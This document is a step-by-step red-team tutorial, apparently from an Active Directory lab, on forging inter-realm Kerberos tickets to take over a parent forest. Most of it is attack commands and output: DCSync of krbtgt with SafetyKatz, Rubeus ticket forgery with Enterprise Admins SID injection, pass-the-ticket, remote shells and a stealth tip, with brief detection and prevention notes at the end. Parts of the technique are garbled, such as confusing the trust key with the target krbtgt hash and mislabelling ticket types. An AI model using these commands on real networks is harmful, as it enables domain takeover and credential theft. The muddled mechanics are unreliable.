#  Cross-Forest Attacks — Forging Inter-Realm TGT & Forest Trust Abuse

**Date:** 16 August 2026

---

## What is Inter-Realm TGT?

**Inter-Realm TGT = Ticket Granting Ticket for cross-forest/cross-realm authentication.**

Used when:
- Accessing resources in different forest
- User from DOLLARCORP accessing MONEYCORP resources
- Trust relationship between forests established
- Need to authenticate across forest boundary

---

## Forest Trust Relationships

**Trust Chain:**
```
User in DOLLARCORP.MONEYCORP.LOCAL
    ↓
Needs access to MONEYCORP.LOCAL (parent forest)
    ↓
Uses inter-realm TGT (KRBTGT trust key)
    ↓
KDC in MONEYCORP issues service ticket
    ↓
Access to MONEYCORP resources
```

---

## Prerequisites for Inter-Realm TGT Forgery

1. **KRBTGT trust account password/hash from trusted forest**
   - Hash of krbtgt account in foreign realm
   - Example: krbtgt for MONEYCORP.LOCAL

2. **Domain SID of current domain (DOLLARCORP)**
   - SID: S-1-5-21-719815819-3726368948-3917688648

3. **Enterprise Admins SID from target forest (MONEYCORP)**
   - SID ending in -519 (Enterprise Admins RID)
   - Example: S-1-5-21-335606122-960912869-3279953914-519

4. **Rubeus.exe** for ticket forgery

5. **Network access to target forest DC**

---

## Step 1: Obtain Inter-Realm Trust Key

**If already Domain Admin in current forest:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:moneycorp\krbtgt" "exit"
```

Extract KRBTGT hash from parent forest (requires DCSync).

---

**Output:**
```
moneycorp\krbtgt: 17e8f4d3f4b46e95048a66a5dd890ee3 (NTLM)
moneycorp\krbtgt: abc123... (AES256)
```

Extract NTLM or AES256 hash.

---

## Step 2: Get Required SIDs

**Current Domain SID (DOLLARCORP):**

```powershell
Get-DomainSID -Domain dollarcorp.moneycorp.local
```

Output: `S-1-5-21-719815819-3726368948-3917688648`

---

**Target Forest Root Domain SID (MONEYCORP):**

```powershell
Get-DomainSID -Domain moneycorp.local
```

Output: `S-1-5-21-335606122-960912869-3279953914`

---

**Enterprise Admins SID of target forest:**

Append `-519` to forest root SID:
```
S-1-5-21-335606122-960912869-3279953914-519
```

(519 = Enterprise Admins RID)

---

## Step 3: Forge Inter-Realm TGT

**Create Silver Ticket for KRBTGT (inter-realm trust):**

```powershell
Rubeus.exe silver 
  /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL 
  /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-519 
  /ldap 
  /user:Administrator 
  /nowrap
```

**Parameters:**
- `/service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL` — Inter-realm trust service
- `/rc4` — KRBTGT hash from target forest (MONEYCORP)
- `/sid` — SID of current domain (DOLLARCORP)
- `/sids` — Enterprise Admins SID of target forest (MONEYCORP) with -519 RID
- `/ldap` — LDAP protocol (enables directory access)
- `/user:Administrator` — Impersonate Administrator in target forest
- `/nowrap` — No line wrapping in output

---

**Output (inter-realm TGT):**

```
[*] Action: Build TGT
[+] Ticket: $krb5tgs$23$*Administrator$DOLLARCORP.MONEYCORP.LOCAL$krbtgt/DOLLARCORP.MONEYCORP.LOCAL*$...
[+] Type: TGT (inter-realm)
[+] Base64 Encoded Ticket: oIIGK...
```

Copy entire Base64 encoded ticket.

---

## Step 4: Use Forged Inter-Realm TGT

**Request service ticket in target forest using forged TGT:**

```powershell
Rubeus.exe asktgs 
  /service:http/mcorp-dc.MONEYCORP.LOCAL 
  /dc:mcorp-dc.MONEYCORP.LOCAL 
  /ptt 
  /ticket:$krb5tgs$23$*Administrator$DOLLARCORP.MONEYCORP.LOCAL$krbtgt/DOLLARCORP.MONEYCORP.LOCAL*$...
```

**Parameters:**
- `/service:http/mcorp-dc.MONEYCORP.LOCAL` — Service in target forest (MONEYCORP)
- `/dc:mcorp-dc.MONEYCORP.LOCAL` — Target forest DC to request from
- `/ptt` — Pass-the-ticket (load into memory)
- `/ticket` — Forged inter-realm TGT from Step 3

---

**Output:**

```
[*] Action: Ask TGS
[*] Using inter-realm TGT
[*] Requesting TGS for http/mcorp-dc.MONEYCORP.LOCAL
[+] TGS obtained successfully
[+] Service ticket loaded into memory
```

---

## Step 5: Access Forest Resources

**Verify ticket loaded:**

```powershell
klist
```

Should show TGS for http/mcorp-dc in MONEYCORP.LOCAL.

---

**Access HTTP service on parent forest DC:**

```powershell
Enter-PSSession -ComputerName mcorp-dc.moneycorp.local
```

Remote shell in target forest as Administrator.

---

**Verify access:**

```powershell
whoami
# Output: MONEYCORP\Administrator

hostname
# Output: MCORP-DC
```

---

## Complete Cross-Forest Attack Workflow

```
1. Extract KRBTGT hash from target forest
   (SafetyKatz DCSync: moneycorp\krbtgt)
   ↓
2. Get current domain SID (DOLLARCORP)
   (Get-DomainSID)
   ↓
3. Get target forest SID (MONEYCORP)
   (Get-DomainSID -Domain moneycorp.local)
   ↓
4. Create inter-realm TGT using Rubeus silver
   (/service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL)
   (/sids:Enterprise-Admins-SID-519)
   ↓
5. Forge ticket with Administrator impersonation
   (/user:Administrator /ldap)
   ↓
6. Request TGS in target forest using forged TGT
   (Rubeus asktgs /service:http/target /dc:target-dc)
   ↓
7. Load ticket into memory (/ptt)
   ↓
8. Access forest resources as Administrator
   (psremoting, wmi, ldap)
   ↓
9. Execute DCSync in target forest
   (Extract parent forest KRBTGT)
   ↓
10. Compromise entire forest
```

---

## Why /sids Parameter is Critical

**/sids adds SID to TGT (Group SID Injection):**

```
Normal TGT:
- Contains user's SID (Administrator)
- Contains user's groups

With /sids (Enterprise Admins):
- Contains user's SID
- Contains user's groups
- PLUS Enterprise Admins SID from target forest
- TGT now claims Administrator is Enterprise Admin
```

**Result:** Impersonated user has EA privileges in target forest.

---

## Alternative: Using AES256 (More Stealthy)

```powershell
Rubeus.exe silver 
  /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL 
  /aes256:abc123def456... 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-519 
  /ldap 
  /user:Administrator
```

AES256 doesn't trigger encryption downgrade detection.

---

## Service Options in Target Forest

| Service | Capability | Command |
|---|---|---|
| http/mcorp-dc | HTTP access | `Rubeus.exe asktgs /service:http/...` |
| ldap/mcorp-dc | LDAP (DCSync) | `Rubeus.exe asktgs /service:ldap/...` |
| cifs/mcorp-dc | SMB/file access | `Rubeus.exe asktgs /service:cifs/...` |
| host/mcorp-dc | WinRM/PSRemoting | `Rubeus.exe asktgs /service:host/...` |
| krbtgt/MONEYCORP | Golden Ticket | `Rubeus.exe asktgs /service:krbtgt/...` |

---

## Real-World Exploitation: Cross-Forest DCSync

**After obtaining inter-realm TGT:**

```powershell
# 1. Request LDAP TGS in parent forest
Rubeus.exe asktgs 
  /service:ldap/mcorp-dc.MONEYCORP.LOCAL 
  /dc:mcorp-dc.MONEYCORP.LOCAL 
  /ptt 
  /ticket:<INTER_REALM_TGT>

# 2. Execute DCSync on parent forest
SafetyKatz.exe "lsadump::dcsync /user:moneycorp\krbtgt" "exit"

# 3. Extract parent forest KRBTGT (Enterprise Admins)
# Now have forest-wide compromise
```

---

## Detection

**What logs:**
- TGT request events (AS-REQ 4768)
- TGS request to krbtgt (4769)
- Cross-realm authentication (4781)
- Unusual group membership (SID injection)

**What doesn't log:**
- Rubeus silver ticket generation (local operation)
- Inter-realm TGT forgery mechanics
- /sids injection detection (if SIEM not configured)

---

## Prevention

- **Monitor inter-realm TGT requests** — Alert on krbtgt/DOMAIN requests
- **Audit forest trust relationships** — Regularly review
- **Monitor SID injection** — Alert on /sids usage patterns
- **Implement MFA** — Reduce impact of compromised credentials
- **Segment forests** — Reduce blast radius
- **Monitor cross-forest access** — Flag unusual patterns
- **Protect KRBTGT accounts** — Highest security tier
- **Implement PKINIT** — Reduce reliance on password-based auth

---

## Key Concepts

**Inter-Realm Trust:**
- Established by forest admins
- Allows users to access resources across forests
- KRBTGT account manages encryption

**SID Injection (/sids):**
- Adds group SID to forged ticket
- TGT claims user has additional groups
- Recipient trusts ticket (signed by KRBTGT)
- User inherits group privileges

**Trust Key (KRBTGT):**
- Shared secret between forests
- Signs tickets recognized by other forest
- Compromise = forest compromise

---

## Command Reference

| Task | Command |
|---|---|
| Extract trust key | `SafetyKatz.exe "lsadump::dcsync /user:forest\\krbtgt"` |
| Get current domain SID | `Get-DomainSID -Domain dollarcorp.moneycorp.local` |
| Get forest root SID | `Get-DomainSID -Domain moneycorp.local` |
| Forge inter-realm TGT | `Rubeus.exe silver /service:krbtgt/DOMAIN /rc4:<hash> /sids:<EA-SID-519>` |
| Request TGS | `Rubeus.exe asktgs /service:service/target /dc:target-dc /ticket:<TGT>` |
| Verify ticket | `klist` |
| DCSync in target | `SafetyKatz.exe "lsadump::dcsync /user:forest\\krbtgt"` |

---

## Cross-Forest Attack Summary

```
INTER-REALM TGT FORGERY:
1. Extract KRBTGT from target forest (requires DA in current forest)
2. Get both domain SIDs
3. Forge inter-realm TGT with Administrator + Enterprise Admins SID
4. Request TGS in target forest (bypasses KDC verification)
5. Impersonate Administrator across forest
6. Access target forest resources
7. Extract parent forest KRBTGT
8. Create Golden Tickets in parent forest
9. Forest-wide compromise
```

---

## Real-World Impact

**Complete forest compromise possible:**
- Access parent forest as Enterprise Admin
- Modify domain objects
- Create backdoor accounts
- DCSync all forest hashes
- Create persistent access
- Lateral movement to other domains

---

## Key Takeaway

```
Inter-Realm TGT Forgery = Cross-Forest Compromise
1. KRBTGT hash (trust key) = Access to other forest
2. SID injection (/sids) = Privilege escalation
3. Forged ticket + target DC = Service access
4. DCSync in target = Forest compromise
5. Perfect for multi-forest environments
```

---

## References

- [Rubeus - Silver Ticket & Inter-Realm](https://github.com/GhostPack/Rubeus)
- [Cross-Forest Attacks (Harmj0y)](https://blog.harmj0y.net/redteaming/the-forest-is-under-control/)
- [SafetyKatz - DCSync](https://github.com/GhostPack/SafetyKatz)
- [Forest Trust Security (Microsoft)](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/forest-trust-process)

---

*Next: Advanced Cleanup & Covering Tracks*
